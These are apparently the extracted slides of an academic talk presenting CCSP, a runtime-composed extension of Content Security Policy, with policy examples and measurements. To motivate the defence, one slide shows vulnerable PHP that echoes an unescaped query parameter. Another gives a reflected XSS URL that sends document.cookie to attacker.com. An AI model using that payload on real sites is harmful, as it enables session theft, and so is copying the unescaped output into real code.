<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition</p>
    <p>S. Calzavara, A. Rabitti, M. Bugliesi Universit Ca Foscari Venezia</p>
  </div>
  <div class="page">
    <p>Web security is hard to get right!  even for web security experts!</p>
    <p>Developing secure web applications is possible, but challenging:</p>
    <p>Complex threat model: web attacks + network attacks  Variegate attacks: session hijacking, CSRF, SSL stripping...  Browsers are natural candidates for security enforcement</p>
    <p>Sadly, the baseline security policy of browsers - the Same Origin Policy - is sub-optimal, because it can be circumvented by content injection attacks</p>
  </div>
  <div class="page">
    <p>Content Injection (1/2) Content injection happens when untrusted inputs are incorrectly treated as markup elements or code (XSS)</p>
    <p>&lt;?php session_start (); ... $query = $_GET [q]; print &quot;Results for: &lt;u&gt; $query &lt;/u&gt;&quot;; ... ?&gt;</p>
  </div>
  <div class="page">
    <p>Content Injection (2/2) How to attack the search page:</p>
    <p>http://weak.com/search.php?q=&lt;/u&gt;&lt;script&gt; document.write (&lt;img src =&quot;http://attacker.com/ leak.php?ck = + document.cookie + &quot;&gt;); &lt;/script&gt;</p>
    <p>Since the attackers script becomes indistinguishable from other scripts in the page, cookie access and leakage is not prevented by the Same Origin Policy</p>
  </div>
  <div class="page">
    <p>Content Security Policy (CSP) CSP is a W3C standard designed to prevent / mitigate content injection:</p>
    <p>A policy language to define restrictions on content loading  Policy specification done at the server side  Policy enforcement done at the browser side</p>
    <p>Core strategy to prevent XSS using (classic) CSP:</p>
  </div>
  <div class="page">
    <p>Example CSP script-src https://example.com; img-src *; default-src none</p>
    <p>Policy semantics:</p>
    <p>External scripts can only be loaded from https://example.com  Inline scripts are blocked (no unsafe-inline in script-src)  Images can be loaded from every web origin  No other web content, e.g., stylesheets, can be loaded</p>
  </div>
  <div class="page">
    <p>Problems with CSP Previous research identified severe issues in the current CSP deployment:</p>
    <p>and HTTP redirects are not easy to support with static white-lists</p>
    <p>CSP evolved to offer robust solutions to the first problem, but only a partial solution to the other two problems</p>
  </div>
  <div class="page">
    <p>Compositional CSP (CCSP) We present CCSP, an extension of CSP based on runtime policy composition</p>
    <p>Dynamic white-lists built by interacting with the content providers, who know their needs, but without giving them full control on security!</p>
  </div>
  <div class="page">
    <p>Running Example</p>
    <p>p.com a.com</p>
    <p>c.com</p>
    <p>b.com</p>
  </div>
  <div class="page">
    <p>Example - Classic CSP (CSP 1 or 2) script-src https://a.com https://b.com; img-src https://c.com</p>
    <p>Problems with this form of policy specification:</p>
    <p>One may argue that this improves security, but previous analyses in the wild showed that this is not the case...</p>
  </div>
  <div class="page">
    <p>Example - Strict CSP (CSP 3) Core idea: do not use white-lists for script inclusion, but nonces</p>
    <p>&lt;script src=https://a.com/stats.js nonce=ab3f5k&gt;</p>
    <p>The updated policy looks as follows:</p>
    <p>script-src nonce-ab3f5k strict-dynamic; img-src https://c.com</p>
    <p>The use of strict-dynamic propagates trust to recursively loaded scripts, so there is no need to white-list b.com anymore</p>
  </div>
  <div class="page">
    <p>Analysis of Strict CSP Benefits:</p>
    <p>Criticisms:</p>
  </div>
  <div class="page">
    <p>Example - CCSP (1/2)</p>
    <p>p.com a.com</p>
    <p>c.com</p>
    <p>b.com</p>
    <p>p.com policy: initial CSP + relaxation bounds</p>
    <p>a.com policy: script dependencies</p>
  </div>
  <div class="page">
    <p>Example - CCSP (2/2) p.com policy</p>
    <p>CSP-Compose script-src https://a.com/stats.js default-src none</p>
    <p>CSP-Intersect scope https://a.com/stats.js; script-src https://*; img-src *; default-src none</p>
    <p>a.com policy</p>
    <p>CSP-Union script-src https://b.com/dep.js img-src https://c.com</p>
    <p>Initial CSP: direct page dependencies</p>
    <p>Upper bounds for relaxation by the script</p>
    <p>Script dependencies</p>
  </div>
  <div class="page">
    <p>Example - CCSP (2/2) p.com policy</p>
    <p>CSP-Compose script-src https://a.com/stats.js; default-src none</p>
    <p>CSP-Intersect scope https://a.com/stats.js; script-src https://*; img-src *; default-src none</p>
    <p>a.com policy</p>
    <p>CSP-Union script-src https://b.com/dep.js; img-src https://c.com</p>
    <p>Policy composition at p.com</p>
    <p>script-src https://a.com/stats.js https://b.com/dep.js; img-src https://c.com; default-src none</p>
  </div>
  <div class="page">
    <p>Analysis of CCSP Benefits:</p>
    <p>Criticisms:</p>
  </div>
  <div class="page">
    <p>Design Evaluation The paper presents an evaluation of three main aspects of CCSP:</p>
  </div>
  <div class="page">
    <p>Impact of CCSP We collected CSP violations in the wild (1352 sites) which may be hard to fix in CSP:</p>
    <p>The use of strict-dynamic can only fix 96 violations in the first category and none of the violations in the second category</p>
    <p>Directive #violations #sites</p>
    <p>script-src 96 30</p>
    <p>font-src 72 3</p>
    <p>frame-src 32 25</p>
    <p>img-src 17 5</p>
    <p>connect-src 12 6</p>
    <p>style-src 2 2</p>
    <p>Violations due to script dependencies</p>
  </div>
  <div class="page">
    <p>Testing CCSP in the wild We implemented CCSP as a Google Chrome extension and tested it on real websites</p>
    <p>Deploying CCSP on these providers benefits a significant fraction of the Web!</p>
    <p>#scripts #violations Type of viol.</p>
    <p>Scripts and violations for top providers</p>
  </div>
  <div class="page">
    <p>The evolution of CSP</p>
    <p>CSP 1 CSP 2 CSP 3 CCSP</p>
    <p>White-listing individual inline scripts</p>
    <p>Simplified recursive script inclusion, improvements in policy specification</p>
    <p>General dynamic policy relaxation using white-lists</p>
  </div>
  <div class="page">
    <p>Conclusion  CSP is facing significant deployment challenges, which its continuous</p>
    <p>evolution is trying to address  CCSP is the first extension of CSP which supports the dynamic nature of</p>
    <p>common web contents, including advertisement and HTTP relocations  CCSP is designed to be secure, backward compatible and easy to deploy   yet, it calls for a paradigm change w.r.t. traditional CSP</p>
    <p>CCSP is an academic proposal, far from a W3C standard, yet the problems it tries to address are still unsolved by CSP. Addressing these issues is important for the success of CSP!</p>
  </div>
  <div class="page">
    <p>Thanks for your attention! www.dais.unive.it/~csp</p>
    <p>csp@dais.unive.it</p>
  </div>
</Presentation>
